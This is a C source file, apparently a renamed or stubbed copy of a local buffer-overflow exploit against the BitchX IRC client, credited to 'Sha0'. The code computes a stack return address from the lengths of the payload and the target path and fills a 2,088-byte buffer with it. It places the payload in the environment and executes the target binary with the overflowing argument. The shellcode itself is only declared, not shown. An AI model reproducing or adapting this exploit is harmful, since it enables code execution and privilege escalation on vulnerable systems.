#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  buff ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (char*,int) ; 
 int /*<<< orphan*/  FUNC1 (char*,char**,char**) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 scalar_t__ FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC6 () ; 
 char* payload ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  stdout ; 
 unsigned long FUNC8 (char*) ; 

int FUNC9 (int argc, char **argv) {
 
 char *buff;
 char *arg1="bash";
 char *arg2="-c";
 char *arg[]={arg1,arg2,buff,NULL};
 char *env[]={"TERM=xterm",payload,NULL};
 char offset[]="";
 char sret[4];
 unsigned long lret;
 int i;

 if (argc != 2) {
  FUNC2 (stdout,"BitchX exploit Coded By Sha0\n");
  FUNC2 (stdout,"ej: %s /usr/bin/BitchX\n\n",argv[0]);
  return (1);
 }

 buff = (char *)FUNC4 (2100);
 FUNC0 (buff,sizeof(buff));
 arg[2] = buff;
 
 FUNC6 ();

 lret = 0xbffffffa - FUNC8(payload) - FUNC8(argv[1]);
 sret[0] = (0x000000ff & lret);
 sret[1] = (0x0000ff00 & lret) >> 8;
 sret[2] = (0x00ff0000 & lret) >> 16;
 sret[3] = (0xff000000 & lret) >> 24;

 for (i=0;i<2088;i+=4) // 2088 tirando largo.
  FUNC5 (buff+i,sret,4);

 FUNC1 (argv[1],arg,env);
 FUNC7 ("execve()");

 FUNC3 (buff);
 return (0);
}